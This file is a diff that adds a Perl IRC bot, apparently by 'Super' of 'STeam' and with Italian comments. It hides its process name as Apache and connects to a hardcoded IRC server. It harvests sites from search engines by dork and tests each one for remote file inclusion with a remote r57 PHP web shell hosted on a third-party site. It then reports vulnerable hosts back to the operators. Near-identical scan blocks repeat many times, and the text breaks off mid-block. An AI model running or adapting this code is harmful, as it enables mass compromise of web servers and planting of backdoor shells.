@@ -1,0 +1,4388 @@
+#!/usr/local/lib/perl5/5.8.6/perl
+#Autore Super
+ 
+use IO::Socket::INET;
+use HTTP::Request;
+use LWP::UserAgent;
+ 
+my $autore="Super";
+my $group="STeam";
+my $mnick=int(rand(1000));
+my $processo = "/usr/local/apache/bin/httpd -DSSL";
+my $id="http://allindia-classified.com/images/r57.txt?";
+my $r57="http://allindia-classified.com/images/r57.txt?";
+my $server="64.106.143.81";
+my $porta="6667";
+my $nick="MioScanner".$mnick."";
+my $start="!scan".$mnick."";
+my $canale="#steam";
+my $versione="9.0";
+my $pid=fork;
+exit if $pid;
+$0="$processo"."\0"x16;
+my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
+$sk->autoflush(1);
+print $sk "NICK $nick\r\n";
+print $sk "USER STeamBot 8 *  : STeam : STeam@google.it : Super :SBot\r\n";
+print $sk "JOIN $canale\r\n";
+ 
+while($line = <$sk>){
+ 
+$line =~ s/\r\n$//;
+if ($line=~ /^PING \:(.*)/)
+{
+print "PONG :$1";
+print $sk "PONG :$1";
+}
+ 
+if ($line=~ /PRIVMSG $canale :!info/){
+scrivi($sk, "PRIVMSG $canale :4Scanner Versione $versione by $autore $group Group");
+scrivi($sk, "PRIVMSG $canale :7Per scannare $start Bug Dork");
+scrivi($sk, "PRIVMSG $canale :7Per le stringhe 11!strings");
+scrivi($sk, "PRIVMSG $canale :11r57 !r57");
+scrivi($sk, "PRIVMSG $canale :7No Patch or MassKick and AutoPatch in my CMD");
+scrivi($sk, "PRIVMSG $canale :13Buona Scansione a Tutti");
+}
+ 
+if ($line =~ /PRIVMSG $canale :!id/){
+        my $test = $id;
+        my $req= HTTP::Request->new(GET=>$test);
+        my $ua=LWP::UserAgent->new();
+        $ua->timeout(5);
+        my $response=$ua->request($req);
+        if ($response->is_success) {
+            my $re=$response->content;
+            if ($re =~ /r57shell/) {
+                sleep(1);
+                scrivi($sk, "PRIVMSG $canale :La cmd funziona");
+            }
+        }
+        else {
+              scrivi($sk, "PRIVMSG $canale :La cmd Non funziona");
+            }
+}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :!strings/){
+scrivi($sk, "PRIVMSG $canale :0,4 STRINGS http://d35m0.altervista.org/d35m0/dork.txt");
+}
+ 
+if ($line=~ /PRIVMSG $canale :!r57/){
+scrivi($sk, "PRIVMSG $canale :11 r57 $r57");
+}
+ 
+if ($line=~ /\!sup\s+(.*)/){
+print $sk "$1\r\n";
+}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13$bug15)");
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13$chiave15)");
+scrivi($sk, "PRIVMSG $canale :11Scansione in Corso");
+my @mlist=&msn($chiave);
+push ( my @tot, @mlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSN7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Msn Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Msn Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Msn");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Msn ");
+}}}
+}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mdelist=&msnde($chiave);
+push ( my @tot, @mdelist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnDe Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnDe Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnDe");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnDe ");
+}}}
+}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @msnitlist=&msnit($chiave);
+push ( my @tot, @msnitlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNIt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnIt Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnIt Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnIt");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnIt");
+}}}
+}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @muklist=&msnuk($chiave);
+push ( my @tot, @muklist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNUk7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnUk Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnUk Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnUk");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnUk");
+}}}
+}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mnllist=&msnbe($chiave);
+push ( my @tot, @mnllist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNNl7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnNl Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnNl Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnNl");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnNl");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mnolist=&msnno($chiave);
+push ( my @tot, @mnolist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNNo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnNo Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnNo Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnNo");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnNo");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mcnlist=&msncn($chiave);
+push ( my @tot, @mcnlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNCn7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnCn Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnCn Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnCn");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnCn");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mrulist=&msnca($chiave);
+push ( my @tot, @mrulist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MsnCa7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnCa Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnCa Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnCa");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnCa");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mjplist=&msnjp($chiave);
+push ( my @tot, @mjplist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSNJp7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnJp Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnJp Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnJp");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnJp");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @alist=&altavista($chiave);
+push ( my @tot, @alist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Altavista7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Altavista Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Altavista Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Altavista");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Altavista");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @mfrlist=&msnfr($chiave);
+push ( my @tot, @mfrlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MsnFr7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9MsnFr Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13MsnFr Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnFr");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su MsnFr");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @indlist=&india($chiave);
+push ( my @tot, @indlist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13IndiaInfo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9IndiaInfo Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13IndiaInfo Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su IndiaInfo");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su IndiaInfo");
+}}}
+}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @grulist=&gru($chiave);
+push ( my @tot, @grulist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleRu7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleRu Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleRu Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleRu");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleRu");
+}}}
+}}
+exit;
+}}
+ 
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @guklist=&guk($chiave);
+push ( my @tot, @guklist );
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleUk7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9GoogleUk Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13GoogleUk Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
